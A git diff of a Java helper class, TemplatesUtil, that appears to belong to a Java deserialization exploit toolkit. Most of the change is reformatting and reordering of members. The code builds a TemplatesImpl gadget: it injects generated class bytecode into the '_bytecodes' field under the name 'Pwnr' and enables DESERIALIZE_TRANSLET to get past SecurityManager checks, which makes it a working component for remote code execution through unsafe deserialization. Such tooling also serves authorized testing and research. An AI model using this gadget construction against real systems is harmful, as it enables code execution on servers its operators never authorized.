@@ -18,6 +18,8 @@ import java.io.Serializable;
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 public class TemplatesUtil {
+    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
+
     static {
         // special case for using TemplatesImpl gadgets with a SecurityManager enabled
         System.setProperty(DESERIALIZE_TRANSLET, "true");
@@ -26,30 +28,8 @@ public class TemplatesUtil {
         System.setProperty("java.rmi.server.useCodebaseOnly", "false");
     }
 
-    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
-
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-
-        private static final long serialVersionUID = -5971610431559700674L;
-
-
-        @Override
-        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
-
-
-        @Override
-        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
-    }
-
-    // required to make TemplatesImpl happy
-    public static class Foo implements Serializable {
-
-        private static final long serialVersionUID = 8207363842866235160L;
-    }
-
-
-    public static Object createTemplatesImpl ( final String[] args ) throws Exception {
-        if ( Boolean.parseBoolean(System.getProperty("upstreamXalan", "false")) ) {
+    public static Object createTemplatesImpl(final String[] args) throws Exception {
+        if (Boolean.parseBoolean(System.getProperty("upstreamXalan", "false"))) {
             return createTemplatesImpl(
                     args,
                     Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
@@ -60,8 +40,7 @@ public class TemplatesUtil {
         return createTemplatesImpl(args, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
-
-    public static <T> T createTemplatesImpl ( final String[] args, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+    public static <T> T createTemplatesImpl(final String[] args, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
             throws Exception {
         final T templates = tplClass.newInstance();
 
@@ -75,12 +54,11 @@ public class TemplatesUtil {
 
         StringBuilder sb = new StringBuilder();
         boolean first = true;
-        for ( String arg : args ) {
+        for (String arg : args) {
 
-            if ( !first ) {
+            if (!first) {
                 sb.append(',');
-            }
-            else {
+            } else {
                 first = false;
             }
 
@@ -98,7 +76,7 @@ public class TemplatesUtil {
         final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                 classBytes, ClassFiles.classAsBytes(Foo.class)
         });
 
@@ -106,5 +84,26 @@ public class TemplatesUtil {
         Reflections.setFieldValue(templates, "_name", "Pwnr");
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
+    }
+
+    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+
+        private static final long serialVersionUID = -5971610431559700674L;
+
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        }
+
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        }
+    }
+
+    // required to make TemplatesImpl happy
+    public static class Foo implements Serializable {
+
+        private static final long serialVersionUID = 8207363842866235160L;
     }
 }
